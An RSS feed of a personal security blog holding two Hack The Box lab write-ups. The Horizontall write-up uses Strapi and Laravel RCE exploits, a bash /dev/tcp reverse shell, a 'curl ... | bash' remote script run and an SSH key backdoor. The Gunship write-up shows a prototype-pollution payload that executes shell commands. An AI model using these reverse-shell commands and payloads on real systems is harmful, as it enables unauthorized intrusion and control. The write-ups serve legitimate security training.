<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on Harshit Maheshwari</title>
        <link>https://harshitm98.github.io/posts/</link>
        <description>Recent content in Posts on Harshit Maheshwari</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <copyright>&lt;a href=&#34;https://creativecommons.org/licenses/by-nc/4.0/&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;CC BY-NC 4.0&lt;/a&gt;</copyright>
        <lastBuildDate>Tue, 04 Jan 2022 00:00:00 +0000</lastBuildDate>
        <atom:link href="https://harshitm98.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>HTB Horizontall - Writeup</title>
            <link>https://harshitm98.github.io/posts/htb-machine-horizontall/</link>
            <pubDate>Tue, 04 Jan 2022 00:00:00 +0000</pubDate>
            
            <guid>https://harshitm98.github.io/posts/htb-machine-horizontall/</guid>
            <description>Enumeration Before we start enumeration, let&amp;rsquo;s add IP 10.10.11.105 to /etc/hosts as horizontall.htb
/etc/hosts:
10.10.11.105 horizontall.htb Initial Scans Nmap Scan
# Nmap 7.91 scan initiated Thu Dec 30 19:29:02 2021 as: nmap -vv --reason -Pn --min-rate=10000 -sV -sC --version-all -oN /home/fakebatman/CTFs/htb/machines/horizontall/results/horizontall.htb/scans/_quick_tcp_nmap.txt -oX /home/fakebatman/CTFs/htb/machines/horizontall/results/horizontall.htb/scans/xml/_quick_tcp_nmap.xml horizontall.htb Increasing send delay for 10.10.11.105 from 0 to 5 due to 223 out of 743 dropped probes since last increase. Warning: 10.10.11.105 giving up on port because retransmission cap hit (10).</description>
            <content type="html"><![CDATA[<h1 id="enumeration">Enumeration</h1>
<p>Before we start enumeration, let&rsquo;s add IP <code>10.10.11.105</code> to <code>/etc/hosts</code> as <code>horizontall.htb</code></p>
<p><em>/etc/hosts</em>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">10.10.11.105    horizontall.htb
</code></pre></div><h2 id="initial-scans">Initial Scans</h2>
<p>Nmap Scan</p>
<pre><code class="language-nmap" data-lang="nmap"># Nmap 7.91 scan initiated Thu Dec 30 19:29:02 2021 as: nmap -vv --reason -Pn --min-rate=10000 -sV -sC --version-all -oN /home/fakebatman/CTFs/htb/machines/horizontall/results/horizontall.htb/scans/_quick_tcp_nmap.txt -oX /home/fakebatman/CTFs/htb/machines/horizontall/results/horizontall.htb/scans/xml/_quick_tcp_nmap.xml horizontall.htb
Increasing send delay for 10.10.11.105 from 0 to 5 due to 223 out of 743 dropped probes since last increase.
Warning: 10.10.11.105 giving up on port because retransmission cap hit (10).
Nmap scan report for horizontall.htb (10.10.11.105)
Host is up, received user-set (0.046s latency).
Scanned at 2021-12-30 19:29:02 EST for 13s
Not shown: 995 closed ports
Reason: 995 conn-refused
PORT     STATE    SERVICE REASON      VERSION
22/tcp   open     ssh     syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDL2qJTqj1aoxBGb8yWIN4UJwFs4/UgDEutp3aiL2/6yV2iE78YjGzfU74VKlTRvJZWBwDmIOosOBNl9nfmEzXerD0g5lD5SporBx06eWX/XP2sQSEKbsqkr7Qb4ncvU8CvDR6yGHxmBT8WGgaQsA2ViVjiqAdlUDmLoT2qA3GeLBQgS41e+TysTpzWlY7z/rf/u0uj/C3kbixSB/upkWoqGyorDtFoaGGvWet/q7j5Tq061MaR6cM2CrYcQxxnPy4LqFE3MouLklBXfmNovryI0qVFMki7Cc3hfXz6BmKppCzMUPs8VgtNgdcGywIU/Nq1aiGQfATneqDD2GBXLjzV
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIyw6WbPVzY28EbBOZ4zWcikpu/CPcklbTUwvrPou4dCG4koataOo/RDg4MJuQP+sR937/ugmINBJNsYC8F7jN0=
|   256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJqmDVbv9RjhlUzOMmw3SrGPaiDBgdZ9QZ2cKM49jzYB
80/tcp   open     http    syn-ack     nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 1BA2AE710D927F13D483FD5D1E548C9B
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: horizontall
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Dec 30 19:29:15 2021 -- 1 IP address (1 host up) scanned in 13.57 seconds
</code></pre><ul>
<li>Only port 22, 80 are open</li>
</ul>
<h3 id="ffuf-scans">ffuf scans</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ffuf -u http://horizontall.htb/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -c -ic -of html -o f_big.html

        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/
       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/
         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\
</span><span style="color:#ae81ff"></span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://horizontall.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Output file      : f_big.html
 :: File format      : html
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : <span style="color:#ae81ff">10</span>
 :: Threads          : <span style="color:#ae81ff">40</span>
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

img                     <span style="color:#f92672">[</span>Status: 301, Size: 194, Words: 7, Lines: 8<span style="color:#f92672">]</span>
                        <span style="color:#f92672">[</span>Status: 200, Size: 901, Words: 43, Lines: 2<span style="color:#f92672">]</span>
css                     <span style="color:#f92672">[</span>Status: 301, Size: 194, Words: 7, Lines: 8<span style="color:#f92672">]</span>
js                      <span style="color:#f92672">[</span>Status: 301, Size: 194, Words: 7, Lines: 8<span style="color:#f92672">]</span>
                        <span style="color:#f92672">[</span>Status: 200, Size: 901, Words: 43, Lines: 2<span style="color:#f92672">]</span>
:: Progress: <span style="color:#f92672">[</span>220547/220547<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">1422</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:02:57<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
</code></pre></div><ul>
<li>No interesting directories/files found.</li>
<li>Going through the source code also did not yield anything interesting, so I had to dive deeper.</li>
</ul>
<h3 id="diving-deeper-into-source-code">Diving deeper into source code</h3>
<ul>
<li>The source code has link to various JS files. So taking a look at those, one file <code>http://horizontall.htb/js/app.c68eb462.js</code></li>
<li>Search through those files for <code>http://</code> links, hoping to find some interesting sub directory / sub domain, I found <code>api-prod</code> subdomain.</li>
</ul>
<p><img src="/img/horizontall/Pasted%20image%2020211230200846.png" alt=""></p>
<h3 id="fuzzing-for-directories-on-api-prod">Fuzzing for directories on <code>api-prod</code></h3>
<p>Before we fuzz, let&rsquo;s add IP <code>10.10.11.105</code> to <code>/etc/hosts</code> as <code>api-prod.horizontall.htb</code></p>
<p><em>/etc/hosts</em>:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">10.10.11.105    horizontall.htb api-prod.horizontall.htb
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ffuf -u http://api-prod.horizontall.htb/FUZZ -ic -c -w /usr/share/wordlists/dirb/common.txt -of html -o f_api_prod_common.html

        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/
       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\
</span><span style="color:#ae81ff"></span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/
         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\
</span><span style="color:#ae81ff"></span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://api-prod.horizontall.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Output file      : f_api_prod_common.html
 :: File format      : html
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : <span style="color:#ae81ff">10</span>
 :: Threads          : <span style="color:#ae81ff">40</span>
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

                        <span style="color:#f92672">[</span>Status: 200, Size: 413, Words: 76, Lines: 20<span style="color:#f92672">]</span>
admin                   <span style="color:#f92672">[</span>Status: 200, Size: 854, Words: 98, Lines: 17<span style="color:#f92672">]</span>
Admin                   <span style="color:#f92672">[</span>Status: 200, Size: 854, Words: 98, Lines: 17<span style="color:#f92672">]</span>
ADMIN                   <span style="color:#f92672">[</span>Status: 200, Size: 854, Words: 98, Lines: 17<span style="color:#f92672">]</span>
favicon.ico             <span style="color:#f92672">[</span>Status: 200, Size: 1150, Words: 4, Lines: 1<span style="color:#f92672">]</span>
index.html              <span style="color:#f92672">[</span>Status: 200, Size: 413, Words: 76, Lines: 20<span style="color:#f92672">]</span>
robots.txt              <span style="color:#f92672">[</span>Status: 200, Size: 121, Words: 19, Lines: 4<span style="color:#f92672">]</span>
reviews                 <span style="color:#f92672">[</span>Status: 200, Size: 507, Words: 21, Lines: 1<span style="color:#f92672">]</span>
users                   <span style="color:#f92672">[</span>Status: 403, Size: 60, Words: 1, Lines: 1<span style="color:#f92672">]</span>
:: Progress: <span style="color:#f92672">[</span>4614/4614<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">1055</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:00:04<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
</code></pre></div><p><code>/admin</code> stands out. Visiting admin reveals that it is housing a login page for CMS called <code>strapi</code> at <a href="http://api-prod.horizontall.htb/admin/auth/login">http://api-prod.horizontall.htb/admin/auth/login</a>
<img src="/img/horizontall/Pasted%20image%2020220103200012.png" alt=""></p>
<h3 id="checking-for-vulnerabilities">Checking for vulnerabilities</h3>
<p>Visiting <code>/admin/init</code> we get version number. Version: <code>&quot;strapiVersion&quot;:&quot;3.0.0-beta.17.4&quot;</code></p>
<p><img src="/img/horizontall/Pasted%20image%2020220103200143.png" alt=""></p>
<p>This version is vulnerable to RCE. (Source: <a href="https://www.exploit-db.com/exploits/50239">https://www.exploit-db.com/exploits/50239</a>)</p>
<p>Downloading and running the exploit:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 50239.py http://api-prod.horizontall.htb/
</code></pre></div><p><img src="/img/horizontall/Pasted%20image%2020220103195637.png" alt=""></p>
<p>This exploit let&rsquo;s us run commands on system. Let&rsquo;s try to get a reverse shell.</p>
<h3 id="getting-a-reverse-shell">Getting a reverse shell</h3>
<p>We setup a netcat listener on port 443 (<code>sudo nc -nlvp 443</code>). Our normal payload does not work and does not yield a shell.</p>
<p>Payload:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash -c <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.115/443 0&gt;&amp;1&#34;</span>
</code></pre></div><p><img src="/img/horizontall/Pasted%20image%2020220103201451.png" alt=""></p>
<p>So pasting this command to a file <code>shell.sh</code> and running a Simple HTTP server in that directory using <code>sudo python3 -m http.server 80</code></p>
<p>Then we try to <code>curl</code> our shell.sh and pipe over to bash so that <code>bash</code> can execute our <code>shell.sh</code> and give us a reverse shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl http://10.10.14.13/shell.sh | bash
</code></pre></div><p><img src="/img/horizontall/Pasted%20image%2020220103202111.png" alt=""></p>
<p>and we get a reverse shell</p>
<p><img src="/img/horizontall/Pasted%20image%2020220103202213.png" alt=""></p>
<p>And then we can get the <code>user.txt</code> flag.</p>
<p><img src="/img/horizontall/Pasted%20image%2020220103202251.png" alt=""></p>
<h1 id="post-exploit-enumeration">Post Exploit Enumeration</h1>
<h4 id="active-ports">Active ports</h4>
<p><img src="/img/horizontall/Pasted%20image%2020211230205004.png" alt=""></p>
<h4 id="logging-in-ssh">Logging in SSH</h4>
<p>Inside <code>~</code> (/opt/strapi), we can make <code>.ssh</code> directory and add our public key, so that we can login using SSH instead of running the exploit again and again.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strapi@horizontall:~$ ls -la | grep .ssh
ls -la | grep .ssh
drwx------  <span style="color:#ae81ff">2</span> strapi strapi <span style="color:#ae81ff">4096</span> Jan  <span style="color:#ae81ff">3</span> 23:39 .ssh
</code></pre></div><p>Generate keys (can be on our local machine)</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strapi@horizontall:~/.ssh$ ssh-keygen -f id_rsa
</code></pre></div><p>Then we have two files:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strapi@horizontall:~/.ssh$ ssh-keygen -f id_rsa
ssh-keygen -f id_rsa
Enter passphrase <span style="color:#f92672">(</span>empty <span style="color:#66d9ef">for</span> no passphrase<span style="color:#f92672">)</span>:
Enter same passphrase again:
Generating public/private rsa key pair.
Your identification has been saved in id_rsa.
Your public key has been saved in id_rsa.pub.
The key fingerprint is:
SHA256:DAAaCnPxTt07FSQ7UePvcADqdlsJjJMRz05hCC75Rb0 strapi@horizontall
The key<span style="color:#ae81ff">\&#39;</span>s randomart image is:
+---<span style="color:#f92672">[</span>RSA 2048<span style="color:#f92672">]</span>----+
|+ +oo.++*o<span style="color:#f92672">=</span>      |
|o<span style="color:#f92672">=</span> + +.@.B o     |
|o o + O X.+      |
|   <span style="color:#f92672">=</span> o *E<span style="color:#f92672">=</span> +     |
|    o o S + o    |
|     . . + +     |
|        .   .    |
|                 |
|                 |
+----<span style="color:#f92672">[</span>SHA256<span style="color:#f92672">]</span>-----+
</code></pre></div><p>Copying the contents of <code>id_rsa.pub</code> to <code>authorized_keys</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strapi@horizontall:~/.ssh$ cat id_rsa.pub &gt;&gt; authorized_keys
cat id_rsa.pub &gt; authorized_keys

strapi@horizontall:~/.ssh$ ls -l
ls -l
total <span style="color:#ae81ff">12</span>
-rw-rw-r-- <span style="color:#ae81ff">1</span> strapi strapi  <span style="color:#ae81ff">400</span> Jan  <span style="color:#ae81ff">4</span> 19:17 authorized_keys
-rw------- <span style="color:#ae81ff">1</span> strapi strapi <span style="color:#ae81ff">1675</span> Jan  <span style="color:#ae81ff">4</span> 19:17 id_rsa
-rw-r--r-- <span style="color:#ae81ff">1</span> strapi strapi  <span style="color:#ae81ff">400</span> Jan  <span style="color:#ae81ff">4</span> 19:17 id_rsa.pub
</code></pre></div><p>Changing the permissions of the files:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strapi@horizontall:~/.ssh$ chmod <span style="color:#ae81ff">600</span> authorized_keys
chmod <span style="color:#ae81ff">600</span> authorized_keys
strapi@horizontall:~/.ssh$ chmod <span style="color:#ae81ff">600</span> id_rsa
chmod <span style="color:#ae81ff">600</span> id_rsa
strapi@horizontall:~/.ssh$ chmod <span style="color:#ae81ff">600</span> id_rsa.pub
chmod <span style="color:#ae81ff">600</span> id_rsa.pub
</code></pre></div><p>And then we <code>cat</code> the <code>id_rsa</code> file and copy it to our local machine. Then, we change the permission of that file as well.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ chmod <span style="color:#ae81ff">600</span> id_rsa
</code></pre></div><h4 id="checking-for-open-ports">Checking for open ports</h4>
<p>We can check for ports open on the machine using this command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">strapi@horizontall:~/$ ss -tulpn
</code></pre></div><p><img src="/img/horizontall/Pasted%20image%2020220103203944.png" alt=""></p>
<p>There is port 8000 open (internally) and it hosts a website. Since we cannot access it externally, we will use SSH to forward our queries to this port</p>
<h4 id="local-port-forwarding-using-ssh">Local port forwarding using SSH</h4>
<p>The following commands forwards all the requests on our localhost and port 9000 to the remote host  -&gt; horizontall.htb:8000.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh -L 9000:localhost:8000 -i id_rsa strapi@horizontall.htb
</code></pre></div><p>Checking for open ports on our local machine and we can see that we have port 9000 open</p>
<p><img src="/img/horizontall/Pasted%20image%2020220103204750.png" alt=""></p>
<p>So when we visit http://localhost:9000, all the requests would be forwarded to <a href="http://horizontall.htb:8000/">http://horizontall.htb:8000/</a></p>
<h1 id="privilege-escalation">Privilege Escalation</h1>
<h4 id="remote-port-8000---enumeration">Remote Port 8000 - Enumeration</h4>
<p>The version that is running is: <code>Laravel v8 (PHP v7.4.18)</code></p>
<p><img src="/img/horizontall/Pasted%20image%2020220104145122.png" alt=""></p>
<h4 id="looking-for-exploits">Looking for exploits</h4>
<p>The version <code>Laravel v8 (PHP v7.4.18)</code> is vulnerable to RCE if it is running in debug more. More about RCE <a href="https://www.ambionics.io/blog/laravel-debug-rce">here</a></p>
<p>There is exploit available for this RCE at exploit-db.com -&gt; (<a href="https://www.exploit-db.com/exploits/49424">https://www.exploit-db.com/exploits/49424</a>)</p>
<h4 id="exploiting-laravel">Exploiting Laravel</h4>
<p><em>Before we start exploiting, let&rsquo;s see if this is actually vulnerable ie if this still runs in debug mode.</em></p>
<p>Sending a GET request to -&gt; <code>http://localhost:9000/_ignition/execute-solution</code> -&gt; reveals that debug mode is ON. That means this is exploitable.</p>
<p><img src="/img/horizontall/Pasted%20image%2020220104132325.png" alt=""></p>
<p>We gonna download the RCE from exploit-db. (<a href="https://www.exploit-db.com/exploits/49424">https://www.exploit-db.com/exploits/49424</a>) and run it.</p>
<p>We will be using the <code>shell.sh</code> file we created to get the user shell and use it to get the root shell as well. Setting up reverse shell on port 443 as <code>sudo nc -nlvp 443</code></p>
<p>Running the exploit:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python3 49424.py http://localhost:9000 /home/developer/myproject/storage/logs/laravel.log <span style="color:#e6db74">&#39;curl http://10.10.14.49/shell.sh | bash&#39;</span>
</code></pre></div><p>And we get a shell on our listener. We are root. Yay!</p>
<p><img src="/img/horizontall/Pasted%20image%2020220104145749.png" alt=""></p>
]]></content>
        </item>
        
        <item>
            <title>HTB Gunship - Writeup</title>
            <link>https://harshitm98.github.io/posts/htb-challenge-gunship/</link>
            <pubDate>Mon, 27 Dec 2021 00:00:00 +0000</pubDate>
            
            <guid>https://harshitm98.github.io/posts/htb-challenge-gunship/</guid>
            <description>Access details -&amp;gt; 159.65.31.1:32618
We are provided with a website which has only one input field and we have the source code available.
So let&amp;rsquo;s go through the source code which is made available to us.
Quick Recon  Packages installed (package.json)  &amp;#34;dependencies&amp;#34;: { &amp;#34;express&amp;#34;: &amp;#34;^4.17.1&amp;#34;, &amp;#34;flat&amp;#34;: &amp;#34;5.0.0&amp;#34;, &amp;#34;pug&amp;#34;: &amp;#34;^3.0.0&amp;#34; }  We have pug:3.0.0 which is vulnerable to RCE. Source: https://github.com/pugjs/pug/issues/3312    Location of vulnerability (routes/index.js)  const pug = require(&amp;#39;pug&amp;#39;); .</description>
            <content type="html"><![CDATA[<p>Access details -&gt; 159.65.31.1:32618</p>
<p>We are provided with a website which has only one input field and we have the source code available.</p>
<p>So let&rsquo;s go through the source code which is made available to us.</p>
<h3 id="quick-recon">Quick Recon</h3>
<ul>
<li>Packages installed (<code>package.json</code>)</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">		<span style="color:#e6db74">&#34;dependencies&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> {
			<span style="color:#f92672">&#34;express&#34;</span>: <span style="color:#e6db74">&#34;^4.17.1&#34;</span>,
			<span style="color:#f92672">&#34;flat&#34;</span>: <span style="color:#e6db74">&#34;5.0.0&#34;</span>,
			<span style="color:#f92672">&#34;pug&#34;</span>: <span style="color:#e6db74">&#34;^3.0.0&#34;</span>
		}
</code></pre></div><ul>
<li>We have <code>pug:3.0.0</code> which is vulnerable to RCE.</li>
<li>Source: <a href="https://github.com/pugjs/pug/issues/3312">https://github.com/pugjs/pug/issues/3312</a></li>
</ul>
<hr>
<ul>
<li>Location of vulnerability (<code>routes/index.js</code>)</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">pug</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;pug&#39;</span>);

	...
	<span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/api/submit&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
	    <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">artist</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">unflatten</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>);
	
		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">artist</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;Haigh&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">artist</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;Westaway&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">artist</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;Gingell&#39;</span>)) {
			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({
				<span style="color:#e6db74">&#39;response&#39;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">pug</span>.<span style="color:#a6e22e">compile</span>(<span style="color:#e6db74">&#39;span Hello #{user}, thank you for letting us know!&#39;</span>)({ <span style="color:#a6e22e">user</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;guest&#39;</span> })
			});
		} <span style="color:#66d9ef">else</span> {
			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({
				<span style="color:#e6db74">&#39;response&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Please provide us with the full name of an existing member.&#39;</span>
			});
		}
	});
</code></pre></div><ul>
<li>Request submitted through <code>/api/submit</code> where body of the request(<code>req.body</code>) is passed to <code>unflatten</code>.</li>
<li>So we can pass our payload through the body and when it is unflattened, we can prolly get RCE.</li>
</ul>
<h3 id="exploiting-the-bug">Exploiting the bug</h3>
<ul>
<li>We navigate to <code>/</code> (http://159.65.31.1:32618/) and then enter some random values, intercept the request in Burp.</li>
<li>Modify the request of the body so it looks like:</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTTP" data-lang="HTTP"><span style="color:#a6e22e">POST</span> /api/submit <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">159.65.31.1:32618</span>
Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">170</span>
User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36</span>
Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">*/*</span>
Sec-GPC<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://159.65.31.1:32309</span>
Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://159.65.31.1:32309/</span>
Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-GB,en-US;q=0.9,en;q=0.8</span>
Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>

{
	<span style="color:#f92672">&#34;artist.name&#34;</span>:<span style="color:#e6db74">&#34;Haigh&#34;</span>,<span style="color:#f92672">&#34;__proto__.block&#34;</span>: {
	<span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;Text&#34;</span>, 
	<span style="color:#f92672">&#34;line&#34;</span>: <span style="color:#e6db74">&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;$(ls | grep flag)&#39;)&#34;</span>
	}
}
</code></pre></div><ul>
<li>Output:</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">pre</span>&gt;Error: Command failed: $(ls | grep flag)&lt;<span style="color:#f92672">br</span>&gt;/bin/sh: flagQLGyS: not found&lt;<span style="color:#f92672">br</span>&gt; on line 1&lt;<span style="color:#f92672">br</span>&gt;
</code></pre></div><p><em>Note: We are running <code>$(ls |  grep flag)</code> instead of <code>ls | grep flag</code> because when the command executes without any error, we cannot see the output</em></p>
<ul>
<li>Now let&rsquo;s <code>cat</code> the file
<ul>
<li>Reques bodyt:</li>
</ul>
</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">		{
			<span style="color:#f92672">&#34;artist.name&#34;</span>:<span style="color:#e6db74">&#34;Haigh&#34;</span>,<span style="color:#f92672">&#34;__proto__.block&#34;</span>: {
	        <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;Text&#34;</span>, 
